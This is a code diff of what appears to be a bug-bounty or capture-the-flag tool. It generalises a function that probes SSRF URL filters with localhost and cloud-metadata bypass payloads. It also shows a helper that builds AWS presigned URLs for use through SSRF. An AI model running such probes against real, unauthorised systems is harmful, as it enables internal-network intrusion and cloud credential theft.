@@ -1492,18 +1492,23 @@ def detect_ssrf_filter(
     target_url: str,
     scanner: SecurityScanner,
     test_payloads: list[dict[str, str]] | None = None,
+    *,
+    ssrf_endpoint: str | None = None,
+    ssrf_param: str | None = None,
+    url_suffix: str = "",
 ) -> dict[str, Any]:
-    """Detect SSRF URL filter behavior and identify bypasses.
+    """Detect SSRF URL-filter behavior and identify bypasses.
 
-    Tests different IP encodings and URL tricks against the target's
-    URL fetcher to determine which are blocked and which pass.
+    Generic: the SSRF sink is discovered from the surface (or passed via
+    ``ssrf_endpoint``/``ssrf_param``), and ``url_suffix`` is only used if the
+    caller already found the target's filter needs one. Nothing target-specific
+    is assumed.
 
-    Returns a dict with:
-    - blocked: list of payload names that were blocked
-    - working: list of payload names that passed the filter
-    - blocked_substrings: substrings the filter appears to check
-    - bypasses: list of working bypass payload names
+    Returns blocked / working payload names, inferred blocked substrings, and
+    working bypasses.
     """
+    from bugbounty_ctf.engine import _resolve_ssrf_sink, _ssrf_blocked, _ssrf_fetch
+
     if test_payloads is None:
         test_payloads = SSRF_PAYLOADS_LOCALHOST + SSRF_PAYLOADS_METADATA
 
@@ -1514,43 +1519,27 @@ def detect_ssrf_filter(
         "bypasses": [],
     }
 
+    endpoint, param = _resolve_ssrf_sink(scanner, ssrf_endpoint, ssrf_param)
+    if not endpoint:
+        result["error"] = "no SSRF sink discovered — pass ssrf_endpoint"
+        return result
+
     for payload in test_payloads:
-        url = payload["url"]
-        if "#" not in url:
-            url += "#.yaml"
-
-        r = scanner._make_request(
-            "POST",
-            f"{scanner.base_url}/jobs/preview",
-            data={"url": url},
-        )
-
-        if "Security policy" in r.text or "blocked" in r.text.lower():
+        r = _ssrf_fetch(scanner, endpoint, param, payload["url"], url_suffix=url_suffix)
+        if _ssrf_blocked(r.text):
             result["blocked"].append(payload["name"])
         else:
             result["working"].append(payload["name"])
             if payload["bypasses"] != "none":
                 result["bypasses"].append(payload["name"])
 
-    test_words = ["internal", "metadata", "localhost", "127.0.0.1", "nimbus"]
-    for word in test_words:
-        test_url = f"http://0177.0.0.1:9090/?test={word}#.yaml"
-        r = scanner._make_request(
-            "POST",
-            f"{scanner.base_url}/jobs/preview",
-            data={"url": test_url},
+    # Probe which substrings the filter rejects (loopback host keeps this benign).
+    for word in ["internal", "metadata", "localhost", "127.0.0.1"]:
+        r = _ssrf_fetch(
+            scanner, endpoint, param, f"http://127.0.0.1/?probe={word}", url_suffix=url_suffix
         )
-        if "Security policy" in r.text or "blocked" in r.text.lower():
+        if _ssrf_blocked(r.text):
             result["blocked_substrings"].append(word)
-
-    test_url = "http://0177.0.0.1:9090/?test=%2F#.yaml"
-    r = scanner._make_request(
-        "POST",
-        f"{scanner.base_url}/jobs/preview",
-        data={"url": test_url},
-    )
-    if "Security policy" in r.text or "blocked" in r.text.lower():
-        result["blocked_substrings"].append("%2F (all percent-encoding)")
 
     print(f"[*] SSRF filter: {len(result['blocked'])} blocked, {len(result['working'])} working")
     if result["bypasses"]:
@@ -1573,7 +1562,7 @@ def generate_aws_presigned_url(
     secret_key: str,
     session_token: str,
     region: str = "us-east-1",
-    endpoint_url: str = "http://0177.0.0.1:9090",
+    endpoint_url: str = "",
     params: dict[str, str] | None = None,
 ) -> str:
     """Generate an AWS presigned URL for use via SSRF.
